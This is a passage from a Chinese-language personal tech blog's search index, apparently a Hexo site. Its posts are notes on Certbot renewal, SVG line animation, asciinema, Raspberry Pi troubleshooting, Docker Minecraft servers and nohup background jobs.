target=\"_blank\" rel=\"noopener\">b4b4r07/enhancd: A next-generation cd command with an interactive filter</a></p>\n","categories":["Linux"],"tags":["Linux","zsh","zplug"]},{"title":"Certbot更新憑證失敗記錄","url":"/blog/2018/03/03/logdown/2018-03-03-6672669/","content":"<p>之前有做TSL加密自動化憑證<br>但是遇到一些問題<br>例否我更新Linux導至Certbot壞掉<br>但重安裝Certbot就沒有這個問題</p>\n<p>除了我有設定防火牆問題<br>但還是失敗<br>不過最後還是找到原因，記錄一下</p>\n<a id=\"more\"></a>\n<p>更新完套件，指令換成了<code>certbot</code><br>但用法還是大同小異<br>不過還是更新失敗了</p>\n<p>首先手動執行<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.certbot renew --dry-run</span><br></pre></td></tr></table></figure></p>\n<p>查看有什麼錯誤資訊</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">Processing /etc/letsencrypt/renewal/zhukun.net.conf</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">Cert not yet due for renewal</span><br><span class=\"line\"></span><br><span class=\"line\">The following certs are not due for renewal yet:</span><br><span class=\"line\">  /etc/letsencrypt/live/zhukun.net/fullchain.pem (skipped)</span><br><span class=\"line\">No renewals were attempted.</span><br></pre></td></tr></table></figure>\n<p>有遇到正常的log<br>但看瀏覽器幫很正常…<br>後來爬文，原來要重啟apache…</p>\n<p>有看到用hook-post方法<br><code>certbot renew --post-hook &quot;service httpd restart&quot;</code></p>\n<p>不知道reload會不會就可以了<br>只能等下次5月更新才知道</p>\n<ul>\n<li><a href=\"https://www.zhukun.net/archives/8104\" target=\"_blank\" rel=\"noopener\">启用Let’s Encrypt的免费SSL证书 | 月与灯依旧</a></li>\n<li><a href=\"https://www.bt.cn/bbs/thread-7179-1-1.html\" target=\"_blank\" rel=\"noopener\">Let’s Encrypt SSL安装出现问题 - Linux面板 - 宝塔面板论坛</a></li>\n<li><a href=\"https://www.pigo.idv.tw/archives/3150\" target=\"_blank\" rel=\"noopener\">letsencrypt 工具改成 certbot 了 | 壞蛋的密室</a></li>\n<li><a href=\"https://stringblog.com/%E9%80%9A%E8%BF%87certbot%E9%85%8D%E7%BD%AElets-encrypt%E7%9A%84ssl%EF%BC%88apache%EF%BC%89/\" target=\"_blank\" rel=\"noopener\">通过Certbot配置Let’s Encrypt的SSL（Apache） | StringBlog</a></li>\n</ul>\n","categories":["Apache"],"tags":["Linux","Aapache","certbot"]},{"title":"svg畫邊特效","url":"/blog/2018/03/25/logdown/2018-03-25-7057242/","content":"<h1 id=\"例用CSS-ANIMTION畫邊框\"><a href=\"#例用CSS-ANIMTION畫邊框\" class=\"headerlink\" title=\"例用CSS ANIMTION畫邊框\"></a>例用CSS ANIMTION畫邊框</h1><p><a href=\"https://jsbin.com/huteruhopa/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">https://jsbin.com/huteruhopa/edit?html,css,output</a><br>上面例用CSS Animation做繪制邊框、填色動作<br>參考了<a href=\"https://wcc723.github.io/svg/2014/06/15/svg-css-stroke-animation/\" target=\"_blank\" rel=\"noopener\">CSS + SVG stroke 動態描繪 | 前端，沒有極限</a></p>\n<p><a href=\"http://www.oxxostudio.tw/articles/201406/svg-06-stroke.html\" target=\"_blank\" rel=\"noopener\">SVG 研究之路 (6) - stroke 邊框 - OXXO.STUDIO</a></p>\n<a id=\"more\"></a>\n<h2 id=\"stroke-dasharray-虛線\"><a href=\"#stroke-dasharray-虛線\" class=\"headerlink\" title=\"stroke-dasharray 虛線\"></a>stroke-dasharray 虛線</h2><blockquote>\n<p>Value: none | &lt; dasharray&gt; | inherit<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/stroke-dasharray\" target=\"_blank\" rel=\"noopener\">stroke-dasharray - SVG | MDN</a></p>\n</blockquote>\n<h2 id=\"什麼是-dasharray\"><a href=\"#什麼是-dasharray\" class=\"headerlink\" title=\"什麼是 dasharray?\"></a>什麼是 dasharray?</h2><blockquote>\n<p>stroke-dasharray是把stroke做成了是虛線的效果，線段會被拆成<strong>線段、空白、線段、空白</strong><br> 原本這句看不是很懂，但是從實側做一下<br> 就是 線段長度{1} 空白{0,1}<br> 當只有一個數字<br> 線段、空白都會設為一樣長度(有點像margin、padding)<br> 當然也可以設定不一樣<br> <code>100 20 30 20</code><br>‘stroke-dasharray’ controls the pattern of dashes and gaps used to stroke paths. <dasharray> contains a list of comma and/or white space separated <length>s and <percentage>s that specify the lengths of alternating dashes and gaps. If an odd number of values is provided, then the list of values is repeated to yield an even number of values. Thus, stroke-dasharray: 5,3,2 is equivalent to stroke-dasharray: 5,3,2,5,3,2.<br><a href=\"https://www.w3.org/TR/SVG11/painting.html#StrokeDashoffsetProperty\" target=\"_blank\" rel=\"noopener\">Painting: Filling, Stroking and Marker Symbols – SVG 1.1 (Second Edition)</a></percentage></length></dasharray></p>\n</blockquote>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>好了，知道這樣還是沒法知道為什麼可以連線過去</p>\n<blockquote>\n<p>stroke-dashoffset屬性是將上面的虛線推移，兩者會有以下幾點特性：<br>   推移後，dasharray還是會保持循環。<br>   dashoffset的值不會大於dasharray。<br>   如果dashoffset 等於 dasharray，線段起始點會是空白。</p>\n</blockquote>\n<p>這當出原理看不是很了解<br>原來線長度是dasharray把<strong>線段、空白</strong>設定一樣長度<br>然後對dashoffset做位移動作<br>例如：<br>svg裡的line 500<br>dasharray線段500空白500<br>當你做dashoffset<br>自然而然沒有線，不過dashoffset超過500以上就會跑出來了<br>!!!!等等那不是就沒法做到畫線方法!!!!<br>但只要再把dasharray跟dashoffset設定2000<br>只要大於你的邊線長度就沒有問題了<br>知道原理真的豁然開朗XD</p>\n<p><a href=\"https://jsbin.com/duhudisifi/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">https://jsbin.com/duhudisifi/edit?html,css,output</a><br>小小的改造成慢慢消失</p>\n<h1 id=\"vivus-js\"><a href=\"#vivus-js\" class=\"headerlink\" title=\"vivus.js\"></a>vivus.js</h1><p>在網路上爬到<a href=\"http://www.htmleaf.com/html5/SVG/201501261279.html\" target=\"_blank\" rel=\"noopener\">HTML5 SVG图形轮廓线条绘制动画插件-vivus_jQuery之家-自由分享jQuery、html5、css3的插件库</a><br>有中文翻譯…，果然有中文我才能吸收  orz</p>\n<blockquote>\n<p>下面是一些你在使用SVG文件时需要注意的问题：</p>\n<ul>\n<li>SVG必须以内联的方式放置在HTML文件中，另外不能使用javascript来操控它。</li>\n<li>所有的元素都必须有stroke属性而且不能填充图形。因为插件只是绘制图形的轮廓而不会去检查它的颜色。例如：fill: “none”; ，stroke: “#FFF”;。</li>\n<li>你应该避免创建隐藏的SVG元素。Vivus会在执行动画前过滤掉一些不合格的元素。如果隐藏SVG没有被过滤掉，在执行路径动画时将会出现一些空白区域和缝隙。</li>\n<li>不允许使用text元素，它们不能被转换为path元素。</li>\n</ul>\n</blockquote>\n<p><a href=\"http://nora-anime.net/\" target=\"_blank\" rel=\"noopener\">TVアニメ「ノラと皇女と野良猫ハート」公式サイト</a><br>左上角的logo是用兩個svg作處理<br>我原本以為那個vivus.js有做填色效果….<br>結果後來發現有兩個svg    orz</p>\n<p>這兩個方法差別一個是用css，另一個是用js<br>但原理都相同…<br>所以把<a href=\"http://nora-anime.net/\" target=\"_blank\" rel=\"noopener\">TVアニメ「ノラと皇女と野良猫ハート」公式サイト</a>完整SVG<br>用到<a href=\"https://jsbin.com/huteruhopa/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">https://jsbin.com/huteruhopa/edit?html,css,output</a><br>改一下CSS的class  .cls-2<br>哈    也是可以用XD</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> hi = <span class=\"keyword\">new</span> Vivus(<span class=\"string\">'hi-there'</span>, &#123;<span class=\"attr\">duration</span>:  <span class=\"number\">500</span>&#125; ,<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.console) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Animation finished. [log triggered from callback]'</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;);</span><br></pre></td></tr></table></figure>\n<p>然後這篇文章我放著多天…<br>終於補完了…</p>\n<p>參考來源：<br><a href=\"https://maxwellito.github.io/vivus/\" target=\"_blank\" rel=\"noopener\">https://maxwellito.github.io/vivus/</a><br><a href=\"http://nora-anime.net/\" target=\"_blank\" rel=\"noopener\">http://nora-anime.net/</a><br><a href=\"https://wcc723.github.io/svg/2014/06/15/svg-css-stroke-animation/\" target=\"_blank\" rel=\"noopener\">CSS + SVG stroke 動態描繪 | 前端，沒有極限</a><br><a href=\"http://www.oxxostudio.tw/articles/201406/svg-06-stroke.html\" target=\"_blank\" rel=\"noopener\">SVG 研究之路 (6) - stroke 邊框 - OXXO.STUDIO</a><br><a href=\"http://java.ctolib.com/NBSeven-vue-svg-draw.html\" target=\"_blank\" rel=\"noopener\">一个封装了vivus的vue组件，能够播放svg路径动画 - JavaScript开发社区 | CTOLib码库</a><br><a href=\"https://www.jianshu.com/p/20bfeda0ba3b\" target=\"_blank\" rel=\"noopener\">10 个非常有用的 SVG 动画的 JavaScript 库 - 简书</a><br><a href=\"https://codepen.io/creotip/pen/JodMVL\" target=\"_blank\" rel=\"noopener\">Vivus js</a></p>\n","categories":["網頁特效"],"tags":["CSS","animation","SVG"]},{"title":"終端機錄制工具 asciinema","url":"/blog/2018/03/25/logdown/2018-03-25-terminal-recording-tool-asciinema/","content":"<p>最近想記錄我在筆電上面的終端機設定<br>但以經放著多天，最近在最有空的時候準備整理一下<br>本來想用圖片整理，但logdown不能上傳圖片<br>未來會考慮用hexo來用…</p>\n<p>不過在用hexo之後，剛好看到asciinema可以錄制command指令<br>想說先用這個東西來試試</p>\n<a id=\"more\"></a>\n<p>官方網站有介紹<a href=\"https://asciinema.org/docs/getting-started\" target=\"_blank\" rel=\"noopener\">Getting started - asciinema</a>安裝步驟<br>不過…試過<code>sudo apt-get install asciinema</code><br>在錄制的時候在upload會說版本太舊…</p>\n<p>想說用pip3應該就不會有問題<br>沒想到我電腦沒有pip3<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#安裝pip3</span><br><span class=\"line\">sudo apt-get install python3-pip</span><br><span class=\"line\">#安裝pip</span><br><span class=\"line\">sudo apt-get install python-pip</span><br></pre></td></tr></table></figure></p>\n<p>沒想到在做<code>sudo pip3 install asciinema</code><br>竟然跳出pip版本問題…<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure></p>\n<p>再執行<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip3 install asciinema</span><br></pre></td></tr></table></figure></p>\n<p>可以順利安裝</p>\n<h2 id=\"asciinema-rec-filename\"><a href=\"#asciinema-rec-filename\" class=\"headerlink\" title=\"asciinema rec [filename]\"></a>asciinema rec [filename]</h2><p>錄制開始，結束會問要不要上傳</p>\n<h2 id=\"asciinema-play-filename\"><a href=\"#asciinema-play-filename\" class=\"headerlink\" title=\"asciinema play [filename]\"></a>asciinema play [filename]</h2><p>播放</p>\n<h2 id=\"asciinema-cat-filename\"><a href=\"#asciinema-cat-filename\" class=\"headerlink\" title=\"asciinema cat [filename]\"></a>asciinema cat [filename]</h2><p>查看顯示結果</p>\n<h2 id=\"asciinema-upload-filename\"><a href=\"#asciinema-upload-filename\" class=\"headerlink\" title=\"asciinema  upload  [filename]\"></a>asciinema  upload  [filename]</h2><p>上傳到asciinema網站上面</p>\n<p>錄制結果如下<br><a href=\"https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC\" target=\"_blank\" rel=\"noopener\"><img src=\"https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC.png\" alt=\"asciicast\"></a></p>\n<p>參考來源：<br><a href=\"https://www.jianshu.com/p/34235f5d484a\" target=\"_blank\" rel=\"noopener\">升级pip3的正确姿势 - 简书</a></p>\n","categories":["實用工具"],"tags":["asciinema"]},{"title":"css的小箭頭原理","url":"/blog/2018/03/25/logdown/2018-03-25-7057276/","content":"<p>因為要做blog轉移，所以我就簡單的說明…<br><a href=\"https://wcc723.github.io/css/2013/09/04/css-arrow/\" target=\"_blank\" rel=\"noopener\">CSS的小箭頭 | 前端，沒有極限</a><br>上面說得很清楚，是用border繪制出來的<br>在把其他地方沒用到border顏色改成<code>transparent</code><br>只不過從來沒有想過border可以這樣運用</p>\n<p>參考來源：<br><a href=\"http://www.cssarrowplease.com/\" target=\"_blank\" rel=\"noopener\">cssarrowplease</a><br><a href=\"https://wcc723.github.io/css/2013/09/04/css-arrow/\" target=\"_blank\" rel=\"noopener\">CSS的小箭頭 | 前端，沒有極限</a></p>\n","categories":["網頁特效"],"tags":["CSS"]},{"title":"Raspberry pi 遇到emergency mode問題","url":"/blog/2018/03/26/logdown/2018-03-26-7060547/","content":"<p>很奇怪…今天Raspberry pi 開機遇到emergency mode<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Welcome to emergency mode! After logging in, type &quot;journalctl -xb&quot; to view</span><br><span class=\"line\">system logs, &quot;systemctl reboot&quot; to reboot, &quot;systemctl default&quot; to try again</span><br><span class=\"line\">to boot into default mode.</span><br><span class=\"line\">Give root password for maintenance</span><br><span class=\"line\">(or type Control-D to continue):</span><br></pre></td></tr></table></figure></p>\n<p>平常沒有用鍵盤USB，剛好最近買一個機械式鍵盤剛好是USB<br>剛好可以插在上面，原本還滿擔心可能不能用的問題<br>好險沒有</p>\n<a id=\"more\"></a>\n<p>按Enter竟然可以進去桌面<br>(可能在系統升級跑到桌面設定)<br>後來<code>rasp-config</code>把console設定回來<br>難怪升級之後，覺得開機有比較慢XD</p>\n<p><code>/etc/fstab</code>我也沒有加什麼東西上去…</p>\n<p>於是我<code>fsck /dev/mmcblk0p2</code>修壞軌就能開機了</p>\n<p>不過接hdmi發現右上角有閃電符號…<br>我原本以為是不是充電…<br><a href=\"http://tieba.baidu.com/p/4822934770\" target=\"_blank\" rel=\"noopener\">树莓派屏幕右上角闪电符号是什么意思<em>树莓派吧</em>百度贴吧</a><br>查詢結果是電壓不足….</p>\n<p>不過後來有把鍵盤+滑鼠USB 拿掉就沒有顯示出來<br>可以機械式鍵盤上面的燈太耗電了吧XD</p>\n<p>希望不要再壞一次了</p>\n<p>參考來源：<br><a href=\"http://www.noinf.com/?p=273\" target=\"_blank\" rel=\"noopener\">ubuntu 进入 emergency mode 解决 – 累不死的牛</a><br><a href=\"https://2formosa.blogspot.com/2018/01/linuxe-mergency-mode-when-booting.html\" target=\"_blank\" rel=\"noopener\">阿就操場啊~: Linux開機進入emergency mode</a></p>\n","categories":["Linux"],"tags":["Raspberry PI"]},{"title":"開機執行程式(/etc/rc.d/rc.local、Update-rc.d)筆記","url":"/blog/2018/03/26/logdown/2018-03-26-7060577/","content":"<p>最近玩linux用到…<br>不過還沒實作過<br>因為要做logdown移轉動作<br>先筆記存檔一下</p>\n<ul>\n<li><a href=\"https://www.linuxidc.com/Linux/2017-09/147166.htm\" target=\"_blank\" rel=\"noopener\">Ubuntu 16.04设置rc.local开机启动命令/脚本的方法_Linux教程_Linux公社-Linux系统门户网站</a></li>\n<li><a href=\"https://blog.csdn.net/wzy_1988/article/details/8476901\" target=\"_blank\" rel=\"noopener\">Update-rc.d &amp;&amp; rc.local管理Ubuntu的开机启动 - CSDN博客</a></li>\n<li><a href=\"http://fecbob.pixnet.net/blog/post/39347095-linux%E9%96%8B%E6%A9%9F%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95\" target=\"_blank\" rel=\"noopener\">fecbob.pixnet.net/blog/post/39347095-linux%E9%96%8B%E6%A9%9F%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95</a></li>\n</ul>\n<p>centos<br><a href=\"http://imchao.wang/2014/02/21/make-your-service-autostart-on-linux/\" target=\"_blank\" rel=\"noopener\">在CentOS下配置自启动服务 | 王超的技术博客</a></p>\n","categories":["Linux"],"tags":["rc.local","update-rc.d"]},{"title":"連續打指令&& 與;差別","url":"/blog/2018/03/26/logdown/2018-03-26-7062187/","content":"<p><a href=\"https://community.hpe.com/t5/System-Administration/cron-question-about-multiple-commands/td-p/3444393\" target=\"_blank\" rel=\"noopener\">Solved: cron question about multiple commands - Hewlett Packard Enterprise Community</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Re: cron question about multiple commands</span><br><span class=\"line\">&quot;echo ; ls&quot; will execute both echo and ls, whatever is echo exit code.</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;echo &amp;&amp; ls&quot; will execute ls only if echo exit code is 0.</span><br><span class=\"line\"></span><br><span class=\"line\">Maybe you should do a script. Complex lines in crontab make it not clear and harder to maintain.</span><br><span class=\"line\"></span><br><span class=\"line\">Regards,</span><br><span class=\"line\"></span><br><span class=\"line\">Fred</span><br><span class=\"line\">--</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;Reality is just a point of view.&quot; (P. K. D.)</span><br></pre></td></tr></table></figure></p>\n<p>我有做個小實驗，簡單來講exit code<code>;</code>會傳回最後一個<br>但是<code>&amp;&amp;</code>會兩個看有沒有有沒有成功<br><a href=\"https://i.imgur.com/ei5cDId.png\" target=\"_blank\" rel=\"noopener\">Imgur</a></p>\n","categories":["Linux"],"tags":["Linux"]},{"title":"動畫特效繪制框架(Sketch.js)","url":"/blog/2018/03/29/logdown/2018-03-29-7072140/","content":"<p>Sketch.js</p>\n<p>最近看到<a href=\"http://lost-song.com/\" target=\"_blank\" rel=\"noopener\">TVアニメ『LOST SONG』</a>網站還滿酷的<br>所以研究了一下，發現是使用<a href=\"http://soulwire.github.io/sketch.js/\" target=\"_blank\" rel=\"noopener\">sketch.js</a></p>\n<p>本來想說是很復雜的東西<br>結果看了一下，發現是用官網範例<a href=\"http://soulwire.github.io/Plasmatic-Isosurface/\" target=\"_blank\" rel=\"noopener\">Plasmatic Isosurface</a><br>好像把<code>dat.ui</code>拿掉就跑出上面樣子</p>\n<p>插點看WebGL那邊去了XD<br>不過發現圖象矩陣，感覺也是一門大<del>坑</del>學問</p>\n<p><a href=\"http://lost-song.com/\" target=\"_blank\" rel=\"noopener\">TVアニメ『LOST SONG』</a><br><a href=\"http://soulwire.github.io/sketch.js/\" target=\"_blank\" rel=\"noopener\">sketch.js</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10197789\" target=\"_blank\" rel=\"noopener\">2018鐵人賽索引和心得(圖多慎入) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br><a href=\"http://soulwire.github.io/Plasmatic-Isosurface/\" target=\"_blank\" rel=\"noopener\">Plasmatic Isosurface</a><br><a href=\"http://taobaofed.org/blog/2015/12/21/webgl-handbook/\" target=\"_blank\" rel=\"noopener\">WebGL 技术储备指南 | Taobao FED | 淘宝前端团队</a><br><a href=\"https://github.com/soulwire/Plasmatic-Isosurface\" target=\"_blank\" rel=\"noopener\">soulwire/Plasmatic-Isosurface: A 2 dimensional plasma simulation running on the GPU, written in GLSL and CoffeeScript and rendered with WebGL.</a></p>\n<p>矩陣</p>\n<ul>\n<li><a href=\"https://lfkid.github.io/2016/05/03/%E8%AF%A6%E8%A7%A3CSS%E7%9A%84%E7%9F%A9%E9%98%B5%E5%8F%98%E6%8D%A2%E5%87%BD%E6%95%B0matrix/\" target=\"_blank\" rel=\"noopener\">详解CSS的矩阵变换函数matrix() | 中二病也要玩 front end</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=ywmWnccKXDA\" target=\"_blank\" rel=\"noopener\">【介紹】Geogebra 與線性變換矩陣（1／8）：矩陣變換與圖形 - YouTube</a></li>\n<li><a href=\"https://lfkid.github.io/2016/05/03/%E8%AF%A6%E8%A7%A3CSS%E7%9A%84%E7%9F%A9%E9%98%B5%E5%8F%98%E6%8D%A2%E5%87%BD%E6%95%B0matrix/\" target=\"_blank\" rel=\"noopener\">详解CSS的矩阵变换函数matrix() | 中二病也要玩 front end</a></li>\n<li><a href=\"http://www.eion.com.tw/Blogger/?Pid=1168\" target=\"_blank\" rel=\"noopener\">CSS3 transform-function matrix 變形矩陣</a></li>\n<li><a href=\"http://www.liangshunet.com/ca/201707/793190018.htm\" target=\"_blank\" rel=\"noopener\">CSS3 matrix双板划水、拉伸、打板动画实例animation-亮术网</a></li>\n<li><a href=\"http://ncase.me/matrix/\" target=\"_blank\" rel=\"noopener\">THE MAGNIFICENT 2D MATRIX</a></li>\n<li><a href=\"https://blog.csdn.net/u010884130/article/details/50005437\" target=\"_blank\" rel=\"noopener\">如何通过js获取到CSS3里面transform rotate旋转角度的度数，matrix解析 - CSDN博客</a></li>\n<li><a href=\"http://thecodeplayer.com/walkthrough/matrix-rain-animation-html5-canvas-javascript\" target=\"_blank\" rel=\"noopener\">Matrix rain animation using HTML5 canvas and javascript</a></li>\n</ul>\n","categories":["網頁特效"],"tags":["sketchJS","webGL","matrix"]},{"title":"Raspberry pi 使用USB To TTL連接","url":"/blog/2018/03/31/logdown/2018-03-31-raspberry-pi-uses-usb-to-ttl-connection/","content":"<p>最近樹梅派網路越來越不穩定…<br>有時候對突然連不到…<br>重開主機就可以了<br>但這樣下去 不是辦法<br>所以買一個USB To TTL這個東西跟Raspberry PI 連接</p>\n<a id=\"more\"></a>\n<p>首先，<a href=\"https://www.raspberrypi.com.tw/tag/usb-to-ttl/\" target=\"_blank\" rel=\"noopener\">USB To TTL | Raspberry Pi台灣樹莓派</a><br>基本上照上面做就可以連接到了</p>\n<p>不過…，不知到插上去的位置<br><a href=\"https://elinux.org/Rpi_Low-level_peripherals#General_Purpose_Input.2FOutput_.28GPIO.29\" target=\"_blank\" rel=\"noopener\">RPi Low-level peripherals - eLinux.org</a><br>照上面對照GPIO就不會插錯了</p>\n<p>也有發現用網路線連接方法<a href=\"https://sites.google.com/site/raspberypishare0918/home/di-yi-ci-qi-dong/zhi-jie-lian-bi-dian\" target=\"_blank\" rel=\"noopener\">1.6 直接 連接到 另外一部電腦(用網路線) - 學習樹莓派–Raspberry Pi</a><br>不過也懶的插來插去<br>買個TTL預防萬一</p>\n<p>結果網路問題<code>ifdown eth0</code>再<code>ifup eth0</code> 就能work了….<br>不知道是DHCP問題還是樹莓派問題…<br>還要先繼續觀查…</p>\n","categories":["Linux"],"tags":["Raspberry PI","TTL"]},{"title":"簡單使用docker架設Minecraft-server","url":"/blog/2018/01/14/logdown/2018-01-14-simple-use-of-docker-erection-minecraft-server/","content":"<p>最近想架一個Minecraft-Server<br>但我想找一個比較方便的方法裝<br>後來找到<a href=\"https://hub.docker.com/r/itzg/minecraft-server/\" target=\"_blank\" rel=\"noopener\">itzg/minecraft-server - Docker Hub</a></p>\n<a id=\"more\"></a>\n<p>簡單使用<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -v /path/on/host:/data \\</span><br><span class=\"line\">    -e EULA=TRUE \\</span><br><span class=\"line\">    -p 25565:25565 -e EULA=TRUE --name mc itzg/minecraft-server</span><br></pre></td></tr></table></figure></p>\n<p>Docker Hub分數還滿高的image</p>\n<p>server.properties的設定可以用<code>-e xxx=xxx</code>參數使用</p>\n<p>然後發現<a href=\"https://github.com/itzg/dockerfiles/tree/master/minecraft-server\" target=\"_blank\" rel=\"noopener\">dockerfiles/minecraft-server at master · itzg/dockerfiles</a>作者有寫好docker-compose.yml檔</p>\n<p>可直接使用<code>docker-compose up -d</code><br>可以在<code>docker-compose.yml</code>檔設定一些environment variable<br>和沒有要使用的rcon移除</p>\n<p>要關閉就使用<code>docker-compose down</code><br>但這個不會移除container跟volume<br><code>docker-copmpose down -f</code> 移除container<br>或著<br><code>docker-compose down -v</code>移除container和volume</p>\n","categories":["Docker"],"tags":["Docker"]},{"title":"Linux [nohup]背景執行(command關掉繼續work)","url":"/blog/2018/03/31/logdown/2018-03-31-linux-command-background-execution-turn-off-continue-work/","content":"<p>最近有一台樹莓派網路比較不穩<br>想到另外一台做ping的動作<br>但是command line怎麼背景執行??</p>\n<a id=\"more\"></a>\n<h1 id=\"amp\"><a href=\"#amp\" class=\"headerlink\" title=\"&amp;\"></a>&amp;</h1><p>只要在command後面加&amp;<br>就能背景執行<br>想不到這麼簡單<br><del>不過關掉command就會不見了</del><br>正確來說好像還會繼續執行樣子…(<a href=\"http://www.cnblogs.com/MYSQLZOUQI/p/5283761.html\" target=\"_blank\" rel=\"noopener\">nohup和&amp;的区别 - xiaohuazi - 博客园</a>)</p>\n<h1 id=\"nohup-…-amp\"><a href=\"#nohup-…-amp\" class=\"headerlink\" title=\"nohup … &amp;\"></a>nohup … &amp;</h1><p>在前面加入nohup<br>關掉command就會背景執行<br>會輸出到<code>nohup.out</code></p>\n<h1 id=\"nohup-跟-amp-的指令差別\"><a href=\"#nohup-跟-amp-的指令差別\" class=\"headerlink\" title=\"nohup 跟  &amp; 的指令差別\"></a>nohup 跟  &amp; 的指令差別</h1><blockquote>\n<p>sh 22.sh &amp;<br>将任务放到后台 ，即使关闭xshell退出当前session依然继续运行，但标准输出和标准错误信息会丢失<br>nohup sh 22.sh<br>将任务放到后台，关闭标准输入，前台不再能够接收任何输入（标准输入），重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。<br>nohup sh 22.sh  &amp;<br>将任务放到后台，但是依然可以使用标准输入，前台能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。<br>nohup和&amp;的缺点是，如果你要在一个shell会话里面执行多个命令和脚本，那么要每个命令和脚本都要加nohup和&amp;非常麻烦，所以才有了screen和TMUX</p>\n</blockquote>\n<p><a href=\"http://www.cnblogs.com/MYSQLZOUQI/p/5283761.html\" target=\"_blank\" rel=\"noopener\">nohup和&amp;的区别 - xiaohuazi - 博客园</a></p>\n<p><code>$ nohup your_command &amp;&gt;myout.txt &amp;</code><br>可以重新導向新的輸出<br>但注意<code>&amp;&gt;</code>是連在一起的，不能分開</p>\n<p>看到這篇…，突然想到screen跟tmux<br>還沒記筆記，不過也忘了一半<br>改天再補…</p>\n<p>發現Linux 做ping動作不會有時間…<br><a href=\"http://blog.caihez.com/?p=716\" target=\"_blank\" rel=\"noopener\">Linux/Windows下Ping测试加上返回时间戳的方法 - 彩荷z</a><br><a href=\"https://blog.csdn.net/gtlions/article/details/7974087\" target=\"_blank\" rel=\"noopener\">Linux下长时间ping网络加时间戳并记录到文本 - CSDN博客</a></p>\n<p>參考來源</p>\n<ul>\n<li>[<a href=\"http://dragonspring.pixnet.net/blog/post/33257496-%5Blinux%5Btips%5Dnohup:-%E8%AE%93command%E5%9C%A8%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C%EF%BC%8C%E4%B8%8D%E5%9B%A0%E7%99%BB%E5%87%BA\" target=\"_blank\" rel=\"noopener\">linux[tips]nohup: 讓command在遠端執行，不因登出而中斷 @ 真實旅程 :: 痞客邦 ::</a></li>\n<li><a href=\"http://www.cnblogs.com/MYSQLZOUQI/p/5283761.html\" target=\"_blank\" rel=\"noopener\">nohup和&amp;的区别 - xiaohuazi - 博客园</a></li>\n<li><a href=\"http://linuxdiary.blogspot.com/2007/10/blog-post_30.html\" target=\"_blank\" rel=\"noopener\">Linux 學習日誌: 把命令放到背景執行</a></li>\n<li><a href=\"http://linux.vbird.org/linux_server/0140networkcommand.php#ifup\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – Linux 常用網路指令介紹</a></li>\n<li><a href=\"http://www.makezine.com.tw/make2599131456/raspberry-pi8273188\" target=\"_blank\" rel=\"noopener\">追蹤連線區域網路裝置的Raspberry Pi掃描器 - Make 國際中文版 &gt; DIY Projects, Inspiration, How-tos, Hacks, Mods &amp; More @ Makezine.com.tw - Tweak Technology to Your Will</a></li>\n<li><a href=\"http://linuxdiary.blogspot.com/2007/10/blog-post_30.html\" target=\"_blank\" rel=\"noopener\">Linux 學習日誌: 把命令放到背景執行</a></li>\n<li><a href=\"https://tw.saowen.com/a/63aedd5ffa61bd61c20a8e25445d1f9aba8f4c24d4920b480460fba0a7625353\" target=\"_blank\" rel=\"noopener\">nohup和&amp;後臺執行，程序檢視及終止 - 掃文資訊</a></li>\n</ul>\n","categories":["Linux"],"tags":["Linux","nohup"]},{"title":"2017隨意筆記紀錄","url":"/blog/2017/04/30/logdown/2017-04-30-1775577/","content":"<p><a href=\"2015-random-notes\">←2015 隨意筆記紀錄</a><br>沒有 2016…，這一定有什麼誤會</p>\n<a id=\"more\"></a>\n<p>2017.n</p>\n<p>用一行 CSS 做出全螢幕區塊 (Make full screen sections with 1 line of CSS) &amp; Yijen’s blog - hanasan # 天空部落 TIAN #<br><a href=\"http://hanasan.tian.yam.com/posts/81767301\" target=\"_blank\" rel=\"noopener\">http://hanasan.tian.yam.com/posts/81767301</a></p>\n<p>Bootstrap modal overflow - JSFiddle<br><a href=\"http://jsfiddle.net/jasny/zclse/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/jasny/zclse/</a></p>\n<p>Javascript 設計模式(筆記) (1) 精要＠WFU BLOG<br><a href=\"http://www.wfublog.com/2012/10/javascript-patterns-1.html\" target=\"_blank\" 